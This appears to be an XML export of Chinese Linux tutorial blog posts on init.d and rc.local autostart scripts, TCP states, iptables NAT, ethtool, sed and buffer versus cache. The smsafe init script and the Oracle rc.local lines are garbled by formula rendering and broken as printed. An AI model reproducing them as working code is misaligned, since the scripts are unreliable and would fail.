    <title><![CDATA[rc.local自启动学习]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F63.%20rc.local%E8%87%AA%E5%90%AF%E5%8A%A8%E5%AD%A6%E4%B9%A0%2F</url>
    <content type="text"><![CDATA[rc.local自启动学习&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux有自己一套完整的启动体系，抓住了linux启动的脉络，linux的启动过程将不再神秘。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;本文中假设inittab中设置的init tree为： /etc/rc.d/rc0.d /etc/rc.d/rc1.d /etc/rc.d/rc2.d /etc/rc.d/rc3.d /etc/rc.d/rc4.d /etc/rc.d/rc5.d /etc/rc.d/rc6.d /etc/rc.d/init.d 1. 关于linux的启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init是所有进程的顶层 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init读取/etc/inittab，执行rc.sysinit脚本(注意文件名是不一定的,有些unix甚至会将语句直接写在inittab中) &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rc.sysinit脚本作了很多工作: 1234567init $PATHconfig networkstart swap functionset hostnamecheck root file system, repair if neededcheck root space.... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rc.sysinit根据inittab执行rc?.d脚本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;linux是多用户系统，getty是多用户与单用户的分水岭 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在getty之前运行的是系统脚本 2. 关于rc.d&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;所有启动脚本放置在 /etc/rc.d/init.d下 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;rc?.d中放置的是init.d中脚本的链接，命名格式是: 12S&#123;number&#125;&#123;name&#125;K&#123;number&#125;&#123;name&#125; &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;S开始的文件向脚本传递start参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;K开始的文件向脚本传递stop参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;number决定执行的顺序 3. 启动脚本示例&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是一个用来启动httpd的 /etc/rc.d/init.d/apache 脚本： 12#!/bin/bash...... &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;可以看出他接受start,stop,restart,status参数 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后可以这样建立rc?.d的链接： 12345678cd /etc/rc.d/init.d &amp;&amp;ln -sf ../init.d/apache ../rc0.d/K28apache &amp;&amp;ln -sf ../init.d/apache ../rc1.d/K28apache &amp;&amp;ln -sf ../init.d/apache ../rc2.d/K28apache &amp;&amp;ln -sf ../init.d/apache ../rc3.d/S32apache &amp;&amp;ln -sf ../init.d/apache ../rc4.d/S32apache &amp;&amp;ln -sf ../init.d/apache ../rc5.d/S32apache &amp;&amp;ln -sf ../init.d/apache ../rc6.d/K28apache 4. 关于rc.local&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;经常使用的 rc.local 则完全是习惯问题，不是标准。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;各个发行版有不同的实现方法，可以这样实现： 12345678touch /etc/rc.d/rc.localchmod +x /etc/rc.d/rc.localln -sf /etc/rc.d/rc.local /etc/rc.d/rc1.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc2.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc3.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc4.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc5.d/S999rc.local &amp;&amp;ln -sf /etc/rc.d/rc.local /etc/rc.d/rc6.d/S999rc.local 5. 关于bash启动脚本 /etc/profile /etc/bashrc ~/.bash_profile ~/.bashrc &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;是bash的启动脚本 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一般用来设置单用户的启动环境，也可以实现开机单用户的程序，但要明确他们都是属于bash范畴而不是系统范畴。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;它们的具体作用介绍如下： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/bin/bash这个命令解释程序(后面简称shell)使用了一系列启动文件来建立一个运行环境： /etc/profile /etc/bashrc ~/.bash_profile ~/.bashrc ~/.bash_logout &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;每一个文件都有特殊的功用并对登陆和交互环境有不同的影响。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/profile 和 ~/.bash_profile 是在启动一个交互登陆shell的时候被调用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;/etc/bashrc 和 ~/.bashrc 是在一个交互的非登陆shell启动的时候被调用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;~/.bash_logout 在用户注销登陆的时候被读取 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个交互的登陆shell会在 /bin/login 成功登陆之后运行。一个交互的非登陆shell是通过命令行来运行的，如[prompt]$/bin/bash。一般一个非交互的shell出现在运行 shell脚本的时候。之所以叫非交互的shell，是因为它不在命令行上等待输入而只是执行脚本程序。 6. 关于开机程序的自动启动&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;系统脚本可以放置在/etc/rc.d/init.d中并建立/etc/rc.d/rc?.d链接，也可以直接放置在/etc/rc.d/rc.local中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;init.d脚本包含完整的start,stop,status,reload等参数，是标准做法，推荐使用。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;为特定用户使用的程序（如有的用户需要使用中文输入法而有的不需要）放置在~/中的bash启动脚本中。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置系统自动启动在/etc/init.d/下创建smsafe文件内容： 123456#!/bin/bash# chkconfig: 35 95 1# description: script to start/stop smsafecase 1instart)sh/opt/startsms.sh;;stop)sh/opt/stopsms.sh;;∗)echo"Usage: 0 (start|stop)";;esac &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;更改权限 1# chmod 775 smsafe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;加入自动启动 1# chkconfig –add smsafe &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看自动启动设置 12# chkconfig –list smsafesmsafe 0:off 1:off 2:off 3:on 4:off 5:on 6:off &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以后可以用以下命令启动和停止脚本 12# service smsafe start 启动# service smsafe stop 停止 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;jira 的启动主要依靠的是bin目录下的catalina.sh脚本，提供了如init脚本的start，stop等参数 1234567#!/bin/bash## chkconfig: 2345 85 15# description: jira# processname: jira# source function library. /etc/init.d/functions &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面一行比较重要，为jira的安装路径，没有的话，将会提示找不到文件 12345678910111213141516171819202122232425262728293031323334CATALINA_HOME="/var/www/jira"RETVAL=0start() &#123;echo -n $"Starting jira services: ". /var/www/jira/bin/catalina.sh startRETVAL=$?echo&#125;stop() &#123;echo -n $"Shutting down jira services: ". /var/www/jira/bin/catalina.sh stopRETVAL=$?echo&#125;case "$1" instart)start;;stop)stop;;restart|reload)stopstart;;status)status jiraRETVAL=$?;;*)echo "Usage: 0 &#123;start|stop|restart|status&#125;"exit 1esacexit $RETVAL &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;保存为/etc/init.d/jira&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后利用 12chkconfig --add jiraOK &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;启动 1/etc/init.d/jira start &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;停止 1/etc/init.d/jira stop 以Websphere为例子 在/etc/rc.d/init.d目录下新建启动脚本startWebsphere，键入以下内容： 12#!/bin/sh/opt/WebSphere/AppServer/bin/startServer.sh server1 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改该文件的权限： 1chmod 755 startWebsphere 在对应的目录下建立软连接(假设系统默认进入X11) 12cd /etc/rc.d/rc5.dln -s ../init.d/startWebsphere S99startWebsphere 重启系统即可 linux下oracle的自启动脚本 写一个StartOracle.sql,假设放在/目录下 123vi /StartOracle.sql ##加入如下两行保存startupexit 2.配置/etc/rc.local 12vi /etc/rc.local ##加入如下内容，保存su - oracle -c 'ORACLE H OME/bin/lsnrctlstart ′ su−oracle−c ′ ORACLE_HOME/bin/sqlplus "/as sysdba" @/StartOracle.sql' 如果还要自动启动oracle enterprise manager(em)和isqlplus可以如下配置 12vi /etc/rc.local ##加入su - oracle -c 'ORACLE H OME/bin/emctlstartdbconsole ′ su−oracle−c ′ ORACLE_HOME/bin/isqlplusctl start' &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;要知道em和isqlplus等使用的端口可以查询文件： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;$ORACLE_HOME/install/portlist.ini(以oracle 10.1.0.3为例)]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用netstat查看网络状态详解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F57.%20%E7%94%A8netstat%E6%9F%A5%E7%9C%8B%E7%BD%91%E7%BB%9C%E7%8A%B6%E6%80%81%E8%AF%A6%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[用netstat查看网络状态详解 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通常情况下:一个正常的TCP连接，都会有三个阶段: TCP三次握手; 数据传送; TCP四次挥手 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;注:以下说明最好能结合”图:TCP的状态机”来理解。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SYN: (同步序列编号,Synchronize Sequence Numbers)该标志仅在三次握手建立TCP连接时有效。表示一个新的TCP连接请求。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;ACK: (确认编号,Acknowledgement Number)是对TCP请求的确认标志,同时提示对端系统已经成功接收所有数据。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;FIN: (结束标志,FINish)用来结束一个TCP回话.但对应端口仍处于开放状态,准备接收后续数据。 LISTEN:首先服务端需要打开一个socket进行监听，状态为LISTEN. / The socket is listening for incoming connections. 侦听来自远方TCP端口的连接请求 / SYN_SENT:客户端通过应用程序调用connect进行active open.于是客户端tcp发送一个SYN以请求建立一个连接.之后状态置为SYN_SENT. /*The socket is actively attempting to establish a connection. 在发送连接请求后等待匹配的连接请求 */ SYN_RECV:服务端应发出ACK确认客户端的SYN,同时自己向客户端发送一个SYN. 之后状态置为SYN_RECV /* A connection request has been received from the network. 在收到和发送一个连接请求后等待对连接请求的确认 */ ESTABLISHED: 代表一个打开的连接，双方可以进行或已经在数据交互了。/* The socket has an established connection. 代表一个打开的连接，数据可以传送给用户 */ FIN_WAIT1:主动关闭(active close)端应用程序调用close，于是其TCP发出FIN请求主动关闭连接，之后进入FIN_WAIT1状态./* The socket is closed, and the connection is shutting down. 等待远程TCP的连接中断请求，或先前的连接中断请求的确认 */ CLOSE_WAIT:被动关闭(passive close)端TCP接到FIN后，就发出ACK以回应FIN请求(它的接收也作为文件结束符传递给上层应用程序),并进入CLOSE_WAIT. /* The remote end has shut down, waiting for the socket to close. 等待从本地用户发来的连接中断请求 */ FIN_WAIT2:主动关闭端接到ACK后，就进入了FIN-WAIT-2 ./* Connection is closed, and the socket is waiting for a shutdown from the remote end. 从远程TCP等待连接中断请求 */ LAST_ACK:被动关闭端一段时间后，接收到文件结束符的应用程序将调用CLOSE关闭连接。这导致它的TCP也发送一个 FIN,等待对方的ACK.就进入了LAST-ACK . /* The remote end has shut down, and the socket is closed. Waiting for acknowledgement. 等待原来发向远程TCP的连接中断请求的确认 */ TIME_WAIT:在主动关闭端接收到FIN后，TCP就发送ACK包，并进入TIME-WAIT状态。/* The socket is waiting after close to handle packets still in the network.等待足够的时间以确保远程TCP接收到连接中断请求的确认 */ CLOSING: 比较少见./* Both sockets are shut down but we still don’t have all our data sent. 等待远程TCP对连接中断的确认 */ CLOSED: 被动关闭端在接受到ACK包后，就进入了closed的状态。连接结束./* The socket is not being used. 没有任何连接状态 */ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;TIME_WAIT状态的形成只发生在主动关闭连接的一方。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;主动关闭方在接收到被动关闭方的FIN请求后，发送成功给对方一个ACK后,将自己的状态由FIN_WAIT2修改为TIME_WAIT，而必须再等2倍 的MSL(Maximum Segment Lifetime,MSL是一个数据报在internetwork中能存在的时间)时间之后双方才能把状态 都改为CLOSED以关闭连接。目前RHEL里保持TIME_WAIT状态的时间为60秒。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;当然上述很多TCP状态在系统里都有对应的解释或设置,可见man tcp 关于长连接和短连接:&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;通俗点讲:短连接就是一次TCP请求得到结果后,连接马上结束.而长连接并不马上断开,而一直保持着,直到长连接TIMEOUT(具体程序都有相关参数说明).长连接可以避免不断的进行TCP三次握手和四次挥手. &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;长连接(keepalive)是需要靠双方不断的发送探测包来维持的,keepalive期间服务端和客户端的TCP连接状态是ESTABLISHED.目前http 1.1版本里默认都是keepalive(1.0版本默认是不keepalive的)，ie6/7/8和firefox都默认用的是http 1.1版本了(如何查看当前浏览器用的是哪个版本，这里不再赘述)。Apache,java &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;一个应用至于到底是该使用短连接还是长连接，应该视具体情况而定。一般的应用应该使用长连接。 Linux的相关keepalive参数1234567891011a、 tcp_keepalive_time - INTEGERHow often TCP sends out keepalive messages when keepalive is enabled.Default: 2hours.b、 tcp_keepalive_probes - INTEGERHow many keepalive probes TCP sends out, until it decides that theconnection is broken. Default value: 9.c、 tcp_keepalive_intvl - INTEGERHow frequently the probes are send out. Multiplied bytcp_keepalive_probes it is time to kill not responding connection,after probes started. Default value: 75sec i.e. connectionwill be aborted after ~11 minutes of retries. F5负载均衡上的相关参数说明123456a、Keep Alive IntervalSpecifies, when enabled, how frequently the system sends data over an idle TCP connection, to determine whether the connection is still valid.Specify: Specifies the interval at which the system sends data over an idle connection, to determine whether the connection is still valid. The default is 1800 milliseconds.b、Time WaitSpecifies the length of time that a TCP connection remains in the TIME-WAIT state before entering the CLOSED state.Specify: Specifies the number of milliseconds that a TCP connection can remain in the TIME-WAIT state. The default is 2000. 123c、Idle TimeoutSpecifies the length of time that a connection is idle (has no traffic) before the connection is eligible for deletion.Specify: Specifies a number of seconds that the TCP connection can remain idle before the system deletes it. The default is 300 seconds. Apache的相关参数说明&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;以下是Apache/2.0.61版本的默认参数和说明 12345678910a、KeepAlive:default On.Whether or not to allow persistent connections (more thanone request per connection). Set to “Off” to deactivate.b、MaxKeepAliveRequests:default 100.The maximum number of requests to allowduring a persistent connection. Set to 0 to allow an unlimited amount.We recommend you leave this number high, for maximum performance.c、KeepAliveTimeout:default 15. Number of seconds to wait for the next request from thesame client on the same connection.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何删除脚本中的汉字]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F58.%20%E5%A6%82%E4%BD%95%E5%88%A0%E9%99%A4%E8%84%9A%E6%9C%AC%E4%B8%AD%E7%9A%84%E6%B1%89%E5%AD%97%2F</url>
    <content type="text"><![CDATA[如何删除脚本中的汉字&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;今天遇到个问题，脚本中参杂了中文汉字，现在需要删除所有汉字。以前在脚本中删除一两个汉字，那时手到擒来，匹配所有汉字还是第一次。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;汉字在计算机系统里是按照一定的编码格式表示的，就是常说的 GB2312、GB18030等，只要符合这个编码格式的就都是汉字了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;从GB2312-1980编码开始，汉字都是采用双字节编码。为 了与系统中基本的ASCII字符集区分开，所有汉字编码的每个字节的第一位都是1。GB2312的汉字编码规则为：第一个字节的值在0xb0到0xF7之间，第二个字节的值在0xAO到0xFE直接。由于GB13000是对GB2312的扩展，所以也被称为GBK。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么用sed把符合这些编码格式的用空替代就解决问题了。 sed的命令表达式： 1sed -r "s/[\x81-\xFE][\x40-\xFE]//g" file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;执行以后发现有问题，原来系统的编码设置问题，更新一下： 1LANG=C sed -r "s/[\x81-\xFE][\x40-\xFE]//g" file &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;C代表英文环境ASCII编码格式，再次运行，一切OK。]]></content>
      <tags>
        <tag>Linux</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables中的DNAT、SNAT、和MASQUERADE]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F59.%20iptables%E4%B8%AD%E7%9A%84DNAT%E3%80%81SNAT%E5%92%8CMASQUERADE%2F</url>
    <content type="text"><![CDATA[iptables中DNAT、SNAT和MASQUERADE&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNAT（Destination Network Address Translation,目的地址转换) 通常被叫做目的映谢。而SNAT（Source Network Address Translation，源地址转换）通常被叫做源映谢。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是在设置Linux网关或者防火墙时经常要用来的两种方式。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;首先，要了解一下IP包的结构，如下图所示： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;在任何一个IP数据包中，都会有Source IP Address与Destination IP Address这两个字段，数据包所经过的路由器也是根据这两个字段是判定数据包是由什么地方发过来的，它要将数据包发到什么地方去。而iptables的DNAT与SNAT就是根据这个原理，对Source IP Address与Destination IP Address进行修改。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;然后，再看看数据包在iptables中要经过的链（chain）： &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;图中正菱形的区域是对数据包进行判定转发的地方。在这里，系统会根据IP数据包中的destination ip address中的IP地址对数据包进行分发。如果destination ip adress是本机地址，数据将会被转交给INPUT链。如果不是本机地址，则交给FORWARD链检测。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这也就是说，要做的DNAT要在进入这个菱形转发区域之前，也就是在PREROUTING链中做，比如要把访问202.103.96.112的访问转发到192.168.0.112上： 1iptables -t nat -A PREROUTING -d 202.103.96.112 -j DNAT --to-destination 192.168.0.112 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个转换过程当中，其实就是将已经达到这台Linux网关（防火墙）上的数据包上的destination ip address从202.103.96.112修改为192.168.0.112然后交给系统路由进行转发。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;而SNAT自然是要在数据包流出这台机器之前的最后一个链也就是POSTROUTING链来进行操作 1iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -j SNAT --to-source 58.20.51.66 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这个语句就是告诉系统把即将要流出本机的数据的source ip address修改成为58.20.51.66。这样，数据包在达到目的机器以后，目的机器会将包返回到58.20.51.66也就是本机。如果不做这个操作，那么你的数据包在传递的过程中，reply的包肯定会丢失。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;假如当前系统用的是ADSL/3G/4G动态拨号方式，那么每次拨号，出口IP都会改变，SNAT就会有局限性。 1iptables -t nat -A POSTROUTING -s 192.168.0.0/24 -o eth0 -j MASQUERADE &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;重点在那个『 MASQUERADE 』！这个设定值就是『IP伪装成为封包出去(-o)的那块装置上的IP』！不管现在eth0的出口获得了怎样的动态ip，MASQUERADE会自动读取eth0现在的ip地址然后做SNAT出去，这样就实现了很好的动态SNAT地址转换。]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux下的几个网络连接状态具体含义]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F56.%20Linux%E4%B8%8B%E7%9A%84%E5%87%A0%E4%B8%AA%E7%BD%91%E7%BB%9C%E8%BF%9E%E6%8E%A5%E7%8A%B6%E6%80%81%E5%85%B7%E4%BD%93%E5%90%AB%E4%B9%89%2F</url>
    <content type="text"><![CDATA[Linux下的几个网络连接状态具体含义 LISTEN：首先服务端需要打开一个socket进行监听，状态为LISTEN。 / The socket is listening for incoming connections. 侦听来自远方TCP端口的连接请求 / SYN_SENT：客户端通过应用程序调用connect进行active open，于是客户端TCP发送一个SYN以请求建立一个连接，之后状态置为SYN_SENT。 /The socket is actively attempting to establish a connection. 在发送连接请求后等待匹配的连接请求 / SYN_RECV：服务端应发出ACK确认客户端的SYN，同时自己向客户端发送一个SYN，之后状态置为SYN_RECV。 / A connection request has been received from the network. 在收到和发送一个连接请求后等待对连接请求的确认 / ESTABLISHED：代表一个打开的连接，双方可以进行或已经在数据交互了。 / The socket has an established connection. 代表一个打开的连接，数据可以传送给用户 / FIN_WAIT1：主动关闭(active close)端应用程序调用close，于是其TCP发出FIN请求主动关闭连接，之后进入FIN_WAIT1状态。 / The socket is closed, and the connection is shutting down. 等待远程TCP的连接中断请求，或先前的连接中断请求的确认 / CLOSE_WAIT：被动关闭(passive close)端TCP接到FIN后，就发出ACK以回应FIN请求（它的接收也作为文件结束符传递给上层应用程序），并进入CLOSE_WAIT。 / The remote end has shut down, waiting for the socket to close. 等待从本地用户发来的连接中断请求 / FIN_WAIT2：主动关闭端接到ACK后，就进入了FIN-WAIT-2。 / Connection is closed, and the socket is waiting for a shutdown from the remote end. 从远程TCP等待连接中断请求 / LAST_ACK：被动关闭端一段时间后，接收到文件结束符的应用程序将调用CLOSE关闭连接。这导致它的TCP也发送一个FIN，等待对方的ACK，就进入了LAST-ACK。 / The remote end has shut down, and the socket is closed. Waiting for acknowledgement. 等待原来发向远程TCP的连接中断请求的确认 / TIME_WAIT：在主动关闭端接收到FIN后，TCP就发送ACK包，并进入TIME-WAIT状态。 / The socket is waiting after close to handle packets still in the network.等待足够的时间以确保远程TCP接收到连接中断请求的确认 / CLOSING：比较少见。 / Both sockets are shut down but we still don’t have all our data sent. 等待远程TCP对连接中断的确认 / CLOSED：被动关闭端在接受到ACK包后，就进入了CLOSED的状态，连接结束。 / The socket is not being used. 没有任何连接状态 /]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Linux查看网卡速度调整工作模式]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F55.%20Linux%E6%9F%A5%E7%9C%8B%E7%BD%91%E5%8D%A1%E9%80%9F%E5%BA%A6%E8%B0%83%E6%95%B4%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F%2F</url>
    <content type="text"><![CDATA[Linux查看网卡速度调整工作模式&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;查看网卡速度有两个命令都可以查看： 12mii-tooleth0: negotiated 1000baseT-FD flow-control, link ok &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这表示，eth0网卡的速度为1000M，并且是全双工工作模式，也可以使用 123456789101112131415161718192021ethtool eth0Settings for eth0: Supported ports: [ TP ] Supported link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Supports auto-negotiation: Yes Advertised link modes: 10baseT/Half 10baseT/Full 100baseT/Half 100baseT/Full 1000baseT/Full Advertised auto-negotiation: Yes Speed: 1000Mb/s Duplex: Full Port: Twisted Pair PHYAD: 0 Transceiver: internal Auto-negotiation: on Supports Wake-on: umbg Wake-on: g Current message level: 0x00000007 (7) Link detected: yes &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;Speed 后边的数值就是速度，Duplex后边就是工作不是，full表示全双工，如果是half则表示半双工模式；Auto-negotiation 后边表示是否自动协商 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;那么如何调整网卡的速度以及工作模式？ &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;修改linux网卡的工作模式： ethtool –r ethX 重置ethX网口到自适应模式 ethtool –S ethX 查询ethX网口收发包统计 ethtool –s ethX [speed 10|100|1000] 设置网口速率10/100/1000M [duplex half|full] 设置网口半/全双工 [autoneg on|off] 设置网口是否自协商 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;下面的命令会把eth0设置成全双工非自动协商工作模式，并且速度为100M 1ethtool -s eth0 duplex full autoneg off speed 100 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;设置网卡工作模式开机为全双工的方法： 在/etc/sysconfig/network-script/ifcfg-ethX加入下面这句： 1ETHTOOL_OPTS="speed 100 duplex full autoneg off" 2.将上面的命令写入到/etc/rc.local里面。 1ethtool -s eth0 duplex full autoneg off speed 100]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[详细说明Buffer和Cache的区别]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F52.%20%E8%AF%A6%E7%BB%86%E8%AF%B4%E6%98%8EBuffer%E5%92%8CCache%E7%9A%84%E5%8C%BA%E5%88%AB%2F</url>
    <content type="text"><![CDATA[详细说明Buffer和Cache的区别&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缓存（cached）是把读取过的数据保存起来，重新读取时若命中（找到需要的数据）就不要去读硬盘了，若没有命中就读硬盘。其中的数据会根据读取频率进行组织，把最频繁读取的内容放在最容易找到的位置，把不再读的内容不断往后排，直至从中删除。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缓存（cache）实际并不是缓冲文件的，而是缓冲块的，块是磁盘I/O操作的最小单元。这样，目录、超级块、其它文件系统的薄记数据以及非文件系统的磁盘数据都可以被缓冲了。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;如果缓存有固定的大小，那么缓存太大了也不好，因为这会使得空闲的内存太小而导致进行交换操作（这同样是慢的）。为了最有效地使用实际内存，Linux自动地使用所有空闲的内存作为高速缓冲，当程序需要更多的内存时，它也会自动地减小缓冲的大小。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;缓冲（buffers）是根据磁盘的读写设计的，把分散的写操作集中进行，减少磁盘碎片和硬盘的反复寻道，从而提高系统性能。linux有一个守护进程定期清空缓冲内容（即写磁盘），也可以通过sync命令手动清空缓冲。举个例子吧：我这里有一个ext2的U盘，我往里面cp一个3M的 MP3，但U盘的灯没有跳动，过了一会儿（或者手动输入sync）U盘的灯就跳动起来了。卸载设备时会清空缓冲，所以有些时候卸载一个设备时要等上几秒钟。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;两者都是RAM中的数据。简单来说，buffer是即将要被写入磁盘的，而cache是被从磁盘中读出来的。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;buffer是由各种进程分配的，由进程和系统一起管理.被用在如输入队列等方面，一个简单的例子如某个进程要求有多个字段读入，在所有字段被读入完整之前，进程把先前读入的字段放在buffer中保存。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;cache经常被用在磁盘的I/O请求上，如果有多个进程都要访问某个文件，于是该文件便被做成cache以方便下次被访问，这样可提供系统性能。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;综上所述可以理解为cache系统管理, buffer由进程和系统一起管理.]]></content>
      <tags>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iptables中DNAT、SNAT、和MASQUERADE的理解]]></title>
    <url>%2F2017%2F08%2F10%2FLinux%20%E5%9F%BA%E7%A1%80%2F60.%20iptables%E4%B8%ADDNAT%E3%80%81SNAT%E3%80%81%E5%92%8CMASQUERADE%E7%9A%84%E7%90%86%E8%A7%A3%2F</url>
    <content type="text"><![CDATA[iptables中DNAT、SNAT、和MASQUERADE的理解&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;IPtables中可以灵活的做各种网络地址转换（NAT），网络地址转换主要有两种：SNAT和DNAT &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;SNAT是source network address translation的缩写，即源地址目标转换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;比如，多个PC机使用ADSL路由器共享上网，每个PC机都配置了内网IP，PC机访问外部网络的时候，路由器将数据包的报头中的源地址替换成路由器的ip，当外部网络的服务器比如网站web服务器接到访问请求的时候，他的日志记录下来的是路由器的ip地址，而不是pc机的内网ip； &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;这是因为，这个服务器收到的数据包的报头里边的“源地址”，已经被替换了所以叫做SNAT，基于源地址的地址转换。 &#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160;DNAT是destination network address translation的缩写，即目标网络地址转换。 